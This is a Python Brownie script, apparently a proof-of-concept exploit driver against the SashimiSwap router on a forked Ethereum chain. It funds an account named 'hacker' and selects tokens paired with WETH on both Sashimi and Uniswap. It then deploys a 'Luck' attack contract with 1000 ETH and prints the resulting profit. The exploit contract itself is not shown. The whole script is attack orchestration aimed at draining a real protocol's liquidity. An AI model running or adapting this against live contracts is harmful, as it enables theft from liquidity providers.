from operator import le
from brownie import ZERO_ADDRESS, accounts, interface, Luck
import json

weth = interface.ERC20('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
router = interface.ISashimiRouter('0xe4FE6a45f354E845F954CdDeE6084603CEDB9410')
uni_factory = interface.ISashimiFactory('0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f')

def main():
    hacker = accounts[0]
    for i in range(1, 10):
        accounts[i].transfer(hacker, 1e20)
    weth_pair_tokens = get_all_weth_pair_tokens()
    print('len of tokens in sashimi: ', len(weth_pair_tokens))
    print(weth_pair_tokens)
    weth_pair_tokens_uni = []
    for t in weth_pair_tokens:
        pair = uni_factory.getPair(weth, t)
        if pair == ZERO_ADDRESS:
            continue
        weth_pair_tokens_uni.append(t)
    print('len of tokens in uni: ', len(weth_pair_tokens_uni))
    print(weth_pair_tokens_uni)
    l = Luck.deploy({'from': hacker})
    l.good_luck(weth_pair_tokens_uni, {'from': hacker, 'value': 1e21})
    print('profit: ', (l.balance() - 1e21)/1e18, ' ETH')

def get_all_weth_pair_tokens():
    data = {}
    with open('./data/agg.json', 'r') as f:
        data = json.load(f)

    weth = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
    weth_pair_tokens = []
    for pair_addr in data.keys():
        pair = data[pair_addr]
        token = pair['token1']['address'] if pair['token0']['address'] == weth else pair['token0']['address'] if pair['token1']['address'] == weth else None  
        if token is None or pair['token0']['router_reserve'] < 1e18 or pair['token1']['router_reserve'] < 1e18:
            continue
        weth_pair_tokens.append(token)
    return weth_pair_tokens